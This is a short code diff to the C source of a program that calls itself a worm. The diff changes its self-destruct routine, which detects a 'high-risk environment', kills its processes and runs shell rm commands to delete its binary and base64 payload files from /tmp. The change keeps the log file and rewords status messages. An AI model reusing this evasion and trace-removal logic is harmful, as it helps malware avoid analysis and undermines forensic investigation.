@@ -6,8 +6,11 @@
 #include <sys/wait.h>
 
 // Cleanup files
+// Note: We don't remove worm.log here to allow visibility of self-destruct sequence
+// The log file provides forensic value and shows the worm detected the high-risk environment
 void cleanup_files(void) {
-    system("rm -f /tmp/worm* /tmp/*.b64 /tmp/worm.log 2>/dev/null");
+    system("rm -f /tmp/worm /tmp/*.b64 2>/dev/null");
+    // Keep worm.log for visibility - only remove the binary itself
 }
 
 // Cleanup processes
@@ -19,6 +22,7 @@ void cleanup_processes(void) {
 void self_destruct(void) {
     printf("\n=== SELF-DESTRUCTION MODE ACTIVATED ===\n");
     printf("[!] CRITICAL RISK DETECTED - Initiating self-destruction sequence\n");
+    printf("[!] This operation will remove all traces and exit immediately\n");
     printf("[!] Cleaning up processes...\n");
     
     cleanup_processes();
@@ -26,8 +30,8 @@ void self_destruct(void) {
     printf("[!] Cleaning up files...\n");
     cleanup_files();
     
-    printf("[!] Artifacts cleaned\n");
-    printf("[!] Exiting...\n");
+    printf("[!] All artifacts cleaned\n");
+    printf("[!] Self-destruction complete - exiting now...\n");
     exit(0);
 }
 
